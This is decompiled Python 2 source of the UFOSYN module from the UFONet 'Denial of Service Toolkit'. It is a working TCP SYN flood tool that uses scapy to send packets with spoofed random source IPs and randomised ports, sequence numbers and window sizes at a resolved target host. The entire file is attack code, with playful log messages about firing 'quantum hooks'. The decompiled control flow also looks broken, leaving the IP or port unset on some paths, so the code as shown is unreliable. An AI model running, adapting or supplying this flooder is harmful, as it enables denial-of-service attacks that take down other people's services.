# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: <febry>
"""
UFONet - Denial of Service Toolkit - 2015 - by Mrlink (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket, time, urlparse
try:
    from scapy.all import *
except:
    print "\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python-scapy' or 'pip install scapy'\n"
    sys.exit(2)

def randIP():
    ip = ('.').join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = random.randint(1, 65535)
    return x


def synize(ip, port, rounds):
    n = 0
    try:
        for x in range(0, int(rounds)):
            n = n + 1
            sport = randInt()
            seq = randInt()
            window = randInt()
            IP_p = IP()
            IP_p.src = randIP()
            try:
                IP_p.dst = ip
            except:
                print '[Error] [AI] [UFOSYN] Imposible to resolve IP from target -> [Aborting!]\n'
                break

            TCP_l = TCP()
            TCP_l.sport = sport
            TCP_l.dport = port
            TCP_l.flags = 'S'
            TCP_l.seq = seq
            TCP_l.window = window
            try:
                send(IP_p / TCP_l, verbose=0)
                print "[Info] [AI] [UFOSYN] Firing 'quantum hook' [" + str(n) + '] -> [FLOODING!]'
                time.sleep(1)
            except:
                print "[Error] [AI] [UFOSYN] Failed to engage with 'quantum hook' [" + str(n) + ']'

    except:
        print '[Error] [AI] [UFOSYN] Failing to engage... -> Is still target online? -> [Checking!]'


class UFOSYN(object):

    def attacking(self, target, rounds):
        print '[Info] [AI] TCP SYN Flooder (UFOSYN) is ready to fire: [', rounds, 'quantum hooks ]\n'
        if target.startswith('http://'):
            target = target.replace('http://', '')
            port = 80
        else:
            if target.startswith('https://'):
                target = target.replace('https://', '')
                port = 443
            try:
                ip = socket.gethostbyname(target)
            except:
                try:
                    import dns.resolver
                    r = dns.resolver.Resolver()
                    r.nameservers = ['8.8.8.8', '8.8.4.4']
                    url = urlparse(target)
                    a = r.query(url.netloc, 'A')
                    for rd in a:
                        ip = str(rd)

                except:
                    ip = target

            if ip == '127.0.0.1' or ip == 'localhost':
                print "[Info] [AI] [UFOSYN] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n"
                return
        synize(ip, port, rounds)